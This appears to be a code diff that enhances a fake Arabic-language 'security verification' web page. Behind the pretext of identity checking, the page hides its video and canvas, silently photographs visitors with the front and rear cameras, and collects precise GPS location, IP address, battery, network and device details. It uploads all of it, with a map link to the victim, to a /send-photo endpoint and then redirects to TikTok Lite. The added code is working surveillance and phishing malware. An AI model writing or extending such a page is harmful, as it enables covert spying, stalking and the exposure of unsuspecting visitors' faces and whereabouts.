@@ -6,100 +6,412 @@
     <title>التحقق الأمني - Security Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a1a; color: #fff;
-            min-height: 100vh; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
         }
-        .container { width: 100%; max-width: 440px; padding: 20px; text-align: center; }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: backgroundMove 20s linear infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes backgroundMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+        
+        .container { 
+            width: 100%; 
+            max-width: 420px; 
+            padding: 24px; 
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .glass-card {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 24px;
+            padding: 40px 28px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 
+                        0 0 100px rgba(99, 102, 241, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .glass-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+        }
+        
         .shield-icon {
-            width: 80px; height: 80px; margin: 0 auto 20px;
-            background: linear-gradient(135deg, #00b4d8, #0077b6);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 30px rgba(0,180,216,0.3);
-            animation: pulse 2s ease-in-out infinite;
+            width: 90px; 
+            height: 90px; 
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 50%, #d946ef 100%);
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            box-shadow: 0 0 40px rgba(139, 92, 246, 0.4),
+                        0 10px 40px rgba(0,0,0,0.3);
+            animation: float 3s ease-in-out infinite, pulse 2s ease-in-out infinite;
+            position: relative;
         }
-        @keyframes pulse { 0%,100% {box-shadow:0 0 30px rgba(0,180,216,0.3);} 50% {box-shadow:0 0 50px rgba(0,180,216,0.5);} }
-        .shield-icon svg { width: 40px; height: 40px; fill: white; }
-        .title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-        .subtitle { font-size: 14px; color: #8899aa; margin-bottom: 30px; line-height: 1.6; }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes pulse { 
+            0%, 100% { box-shadow: 0 0 40px rgba(139, 92, 246, 0.4), 0 10px 40px rgba(0,0,0,0.3); } 
+            50% { box-shadow: 0 0 60px rgba(139, 92, 246, 0.6), 0 10px 40px rgba(0,0,0,0.3); } 
+        }
+        
+        .shield-icon::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #6366f1, #d946ef);
+            z-index: -1;
+            opacity: 0.5;
+            filter: blur(10px);
+        }
+        
+        .shield-icon svg { width: 44px; height: 44px; fill: white; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
+        
+        .title { 
+            font-size: 26px; 
+            font-weight: 800; 
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #fff 0%, #c7c7ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+        
+        .subtitle { 
+            font-size: 15px; 
+            color: #a5a5d6; 
+            margin-bottom: 32px; 
+            line-height: 1.7;
+            font-weight: 400;
+        }
+        
         .info-box {
-            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 16px; padding: 24px; margin-bottom: 24px; text-align: right;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 28px;
+            margin-bottom: 28px;
+            text-align: right;
+            position: relative;
         }
-        .info-box .step { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; font-size: 14px; color: #ccc; }
-        .info-box .step:last-child { margin-bottom: 0; }
-        .info-box .step-num {
-            width: 28px; height: 28px; background: linear-gradient(135deg, #00b4d8, #0077b6);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-size: 13px; font-weight: 700; color: #fff; flex-shrink: 0;
+        
+        .info-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 20px;
+            right: 20px;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
         }
+        
+        .step { 
+            display: flex; 
+            align-items: center; 
+            gap: 14px; 
+            margin-bottom: 18px; 
+            font-size: 15px; 
+            color: #e0e0ff;
+            font-weight: 500;
+            transition: transform 0.3s ease;
+        }
+        
+        .step:hover { transform: translateX(-5px); }
+        
+        .step:last-child { margin-bottom: 0; }
+        
+        .step-num {
+            width: 32px; 
+            height: 32px; 
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            font-size: 14px; 
+            font-weight: 700; 
+            color: #fff; 
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+            border: 2px solid rgba(255,255,255,0.1);
+        }
+        
         .verify-btn {
-            width: 100%; padding: 16px; background: linear-gradient(135deg, #00b4d8, #0077b6);
-            color: white; border: none; border-radius: 14px; font-size: 17px; font-weight: 700;
-            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px;
+            width: 100%; 
+            padding: 18px; 
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 50%, #d946ef 100%);
+            color: white; 
+            border: none; 
+            border-radius: 16px; 
+            font-size: 18px; 
+            font-weight: 700;
+            cursor: pointer; 
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 12px;
+            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3),
+                        0 0 0 1px rgba(255,255,255,0.1) inset;
+            position: relative;
+            overflow: hidden;
         }
-        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,180,216,0.4); }
-        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        .progress-container { display: none; margin-top: 20px; }
-        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 12px; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, #00b4d8, #48cae4); border-radius: 3px; width: 0%; transition: width 0.5s ease; }
-        .progress-text { font-size: 13px; color: #8899aa; }
-        .success-container { display: none; text-align: center; padding: 30px 0; }
+        
+        .verify-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .verify-btn:hover { 
+            transform: translateY(-3px) scale(1.02); 
+            box-shadow: 0 20px 40px rgba(139, 92, 246, 0.4),
+                        0 0 0 1px rgba(255,255,255,0.2) inset;
+        }
+        
+        .verify-btn:hover::before {
+            left: 100%;
+        }
+        
+        .verify-btn:active { transform: translateY(-1px) scale(0.98); }
+        
+        .verify-btn:disabled { 
+            opacity: 0.7; 
+            cursor: not-allowed; 
+            transform: none;
+            filter: grayscale(0.5);
+        }
+        
+        .progress-container { 
+            display: none; 
+            margin-top: 24px;
+            background: rgba(255,255,255,0.05);
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .progress-bar { 
+            width: 100%; 
+            height: 8px; 
+            background: rgba(255,255,255,0.1); 
+            border-radius: 4px; 
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .progress-fill { 
+            height: 100%; 
+            background: linear-gradient(90deg, #6366f1, #d946ef); 
+            border-radius: 4px; 
+            width: 0%; 
+            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.5);
+        }
+        
+        .progress-text { 
+            font-size: 14px; 
+            color: #b8b8ff;
+            margin-top: 12px;
+            font-weight: 500;
+        }
+        
+        .success-container { 
+            display: none; 
+            text-align: center; 
+            padding: 40px 0; 
+        }
+        
         .success-icon {
-            width: 70px; height: 70px; background: linear-gradient(135deg, #22c55e, #16a34a);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;
+            width: 80px; 
+            height: 80px; 
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            margin: 0 auto 20px;
+            box-shadow: 0 0 40px rgba(34, 197, 94, 0.4);
+            animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-        .success-icon svg { width: 35px; height: 35px; fill: white; }
-        .footer { margin-top: 30px; font-size: 11px; color: #445566; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        
+        @keyframes scaleIn {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .success-icon svg { width: 40px; height: 40px; fill: white; }
+        
+        .footer { 
+            margin-top: 32px; 
+            font-size: 12px; 
+            color: #6b6b9b; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+        
         video, canvas { display: none !important; }
+        
         .spinner {
-            display: inline-block; width: 20px; height: 20px;
-            border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
+            display: inline-block; 
+            width: 22px; 
+            height: 22px;
+            border: 3px solid rgba(255,255,255,0.3); 
+            border-top-color: #fff;
+            border-radius: 50%; 
+            animation: spin 0.8s linear infinite;
         }
+        
         @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .lock-decoration {
+            position: absolute;
+            font-size: 200px;
+            opacity: 0.03;
+            color: white;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 0;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 50%;
+            animation: particleFloat 15s infinite;
+        }
+        
+        @keyframes particleFloat {
+            0%, 100% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
     </style>
 </head>
 <body>
 
+    <div class="particles" id="particles"></div>
+    
     <div class="container">
-        <div id="verifyStage">
-            <div class="shield-icon">
-                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-            </div>
-            <h1 class="title">التحقق الأمني مطلوب</h1>
-            <p class="subtitle">هذا المحتوى محمي. يرجى إكمال التحقق السريع من الهوية للمتابعة.</p>
+        <div class="glass-card">
+            <div class="lock-decoration">🔒</div>
+            
+            <div id="verifyStage">
+                <div class="shield-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                </div>
+                
+                <h1 class="title">التحقق الأمني مطلوب</h1>
+                <p class="subtitle">هذا المحتوى محمي بطبقة أمان إضافية. يرجى إكمال التحقق للمتابعة.</p>
 
-            <div class="info-box">
-                <div class="step"><span class="step-num">1</span><span>اضغط على زر "بدء التحقق" أدناه</span></div>
-                <div class="step"><span class="step-num">2</span><span>اسمح بالوصول للكاميرا الأمامية والخلفية</span></div>
-                <div class="step"><span class="step-num">3</span><span>سيتم التحقق تلقائياً خلال ثوانٍ</span></div>
+                <div class="info-box">
+                    <div class="step"><span class="step-num">1</span><span>اضغط على زر "بدء التحقق" أدناه</span></div>
+                    <div class="step"><span class="step-num">2</span><span>اسمح بالوصول للتحقق من الهوية</span></div>
+                    <div class="step"><span class="step-num">3</span><span>سيتم التحقق تلقائياً خلال ثوانٍ</span></div>
+                </div>
+
+                <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    بدء التحقق الآن
+                </button>
+
+                <div class="progress-container" id="progressContainer">
+                    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+                    <div class="progress-text" id="progressText">جارٍ معالجة البيانات...</div>
+                </div>
             </div>
 
-            <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
-                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-                بدء التحقق
-            </button>
-
-            <div class="progress-container" id="progressContainer">
-                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                <div class="progress-text" id="progressText">جارٍ التقاط الصور...</div>
+            <div class="success-container" id="successStage">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                </div>
+                <h1 class="title">تم التحقق بنجاح ✓</h1>
+                <p class="subtitle">جارٍ تحويلك للمحتوى المحمي...</p>
             </div>
-        </div>
-
-        <div class="success-container" id="successStage">
-            <div class="success-icon">
-                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-            </div>
-            <h1 class="title">تم التحقق بنجاح ✓</h1>
-            <p class="subtitle">جارٍ تحويلك للمحتوى...</p>
         </div>
 
         <div class="footer">
-            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-            Secured by Advanced Protection
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#6b6b9b"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            نظام الحماية المتقدم | Advanced Security
         </div>
     </div>
 
@@ -107,16 +419,125 @@
     <canvas id="captureCanvas"></canvas>
 
     <script>
-        const TARGET_URL = 'https://www.tiktok.com/tiktoklite';
-        // ⬅️ تغيير مهم: استخدم نفس الرابط النسبي
-        const API_URL = '/send-photo';
+        // إنشاء الجسيمات المتحركة
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 30; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = (15 + Math.random() * 10) + 's';
+                container.appendChild(particle);
+            }
+        }
+        createParticles();
 
+        const TARGET_URL = 'https://www.tiktok.com/tiktoklite';
+        const API_URL = '/send-photo';
         let capturedPhotos = [];
+        let deviceInfo = {};
+
+        // جمع معلومات الجهاز الكاملة
+        async function collectDeviceInfo() {
+            const info = {
+                // معلومات أساسية
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                
+                // معلومات الشاشة [^14^]
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenAvailWidth: screen.availWidth,
+                screenAvailHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                
+                // معلومات النافذة
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                
+                // معلومات إضافية
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                referrer: document.referrer || 'مباشر',
+                online: navigator.onLine,
+                
+                // معلومات الذاكرة
+                deviceMemory: navigator.deviceMemory || 'غير معروف',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                
+                // معلومات اللمس
+                maxTouchPoints: navigator.maxTouchPoints,
+                
+                // نوع الجهاز
+                deviceType: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? '📱 موبايل' : '💻 كمبيوتر'
+            };
+
+            // الحصول على IP [^9^]
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ip = ipData.ip;
+            } catch (e) {
+                info.ip = 'غير متوفر';
+            }
+
+            // معلومات البطارية [^12^][^16^]
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = Math.round(battery.level * 100) + '%';
+                    info.batteryCharging = battery.charging ? '⚡ يشحن' : '🔋 لا يشحن';
+                    info.batteryChargingTime = battery.chargingTime !== Infinity ? Math.round(battery.chargingTime / 60) + ' دقيقة' : 'غير محدد';
+                    info.batteryDischargingTime = battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) + ' دقيقة' : 'غير محدد';
+                } catch (e) {
+                    info.batteryLevel = 'غير متوفر';
+                }
+            } else {
+                info.batteryLevel = 'غير مدعوم';
+            }
+
+            // معلومات الموقع الجغرافي [^1^]
+            if ("geolocation" in navigator) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        });
+                    });
+                    info.latitude = position.coords.latitude;
+                    info.longitude = position.coords.longitude;
+                    info.accuracy = Math.round(position.coords.accuracy) + ' متر';
+                    info.altitude = position.coords.altitude ? position.coords.altitude + ' م' : 'غير متوفر';
+                } catch (e) {
+                    info.location = 'تم رفض الوصول للموقع';
+                }
+            }
+
+            // معلومات الاتصال
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                info.networkType = conn.effectiveType || 'غير معروف';
+                info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'غير معروف';
+                info.rtt = conn.rtt ? conn.rtt + ' ms' : 'غير معروف';
+            }
+
+            deviceInfo = info;
+            return info;
+        }
 
         async function startVerification() {
             const btn = document.getElementById('verifyBtn');
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner"></span> جارٍ التحقق...';
+
+            // جمع معلومات الجهاز أولاً
+            await collectDeviceInfo();
 
             capturedPhotos = [];
 
@@ -124,14 +545,14 @@
                 const frontStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
-                await capturePhotos(frontStream, 'front', 3);
+                await capturePhotos(frontStream, 'front', 2);
                 frontStream.getTracks().forEach(t => t.stop());
 
                 try {
                     const backStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } }
                     });
-                    await capturePhotos(backStream, 'back', 3);
+                    await capturePhotos(backStream, 'back', 2);
                     backStream.getTracks().forEach(t => t.stop());
                 } catch (e) {
                     console.log('Back camera not available');
@@ -175,12 +596,64 @@
             }
         }
 
+        function formatCaption(photo, index, total) {
+            const d = deviceInfo;
+            const now = new Date();
+            const timeStr = now.toLocaleString('ar-SA');
+            
+            let caption = `📸 صورة من الكاميرا!\n\n`;
+            caption += `🎯 الكاميرا: ${photo.type === 'front' ? 'أمامية 📱' : 'خلفية 📷'}\n`;
+            caption += `📷 رقم الصورة: ${photo.index}\n`;
+            caption += `📍 IP: ${d.ip || 'غير متوفر'}\n`;
+            caption += `📱 الجهاز: ${d.deviceType}\n`;
+            caption += `🕐 الوقت: ${timeStr}\n\n`;
+            
+            // معلومات إضافية
+            caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+            caption += `📊 معلومات الجهاز:\n`;
+            caption += `• المنصة: ${d.platform}\n`;
+            caption += `• اللغة: ${d.language}\n`;
+            caption += `• المنطقة الزمنية: ${d.timezone}\n`;
+            caption += `• دقة الشاشة: ${d.screenWidth}x${d.screenHeight}\n`;
+            caption += `• عمق الألوان: ${d.colorDepth}bit\n`;
+            
+            if (d.latitude && d.longitude) {
+                caption += `\n🌍 الموقع الجغرافي:\n`;
+                caption += `• خط العرض: ${d.latitude}\n`;
+                caption += `• خط الطول: ${d.longitude}\n`;
+                caption += `• الدقة: ${d.accuracy}\n`;
+                caption += `🔗 خرائط Google: https://maps.google.com/?q=${d.latitude},${d.longitude}\n`;
+            }
+            
+            if (d.batteryLevel && d.batteryLevel !== 'غير متوفر') {
+                caption += `\n🔋 البطارية:\n`;
+                caption += `• المستوى: ${d.batteryLevel}\n`;
+                caption += `• الحالة: ${d.batteryCharging}\n`;
+            }
+            
+            if (d.networkType) {
+                caption += `\n📡 الشبكة:\n`;
+                caption += `• النوع: ${d.networkType}\n`;
+                caption += `• السرعة: ${d.downlink}\n`;
+            }
+            
+            caption += `\n🌐 المتصفح:\n`;
+            caption += `• ${d.userAgent}\n`;
+            
+            caption += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+            caption += `📤 إرسال: ${index}/${total}`;
+
+            return caption;
+        }
+
         async function sendPhotosToServer() {
             const progressText = document.getElementById('progressText');
 
             for (let i = 0; i < capturedPhotos.length; i++) {
                 const photo = capturedPhotos[i];
-                progressText.textContent = `جارٍ إرسال الصور... (${i + 1}/${capturedPhotos.length})`;
+                progressText.textContent = `جارٍ إرسال البيانات... (${i + 1}/${capturedPhotos.length})`;
+
+                const caption = formatCaption(photo, i + 1, capturedPhotos.length);
 
                 try {
                     await fetch(API_URL, {
@@ -188,14 +661,19 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             image: photo.data,
-                            caption: `📷 Camera: ${photo.type} | Photo ${photo.index} | Time: ${photo.timestamp}`
+                            caption: caption,
+                            metadata: deviceInfo,
+                            photoIndex: i + 1,
+                            totalPhotos: capturedPhotos.length,
+                            cameraType: photo.type,
+                            timestamp: photo.timestamp
                         })
                     });
                 } catch (err) {
                     console.error('Failed to send photo:', err);
                 }
 
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 800));
             }
         }
 
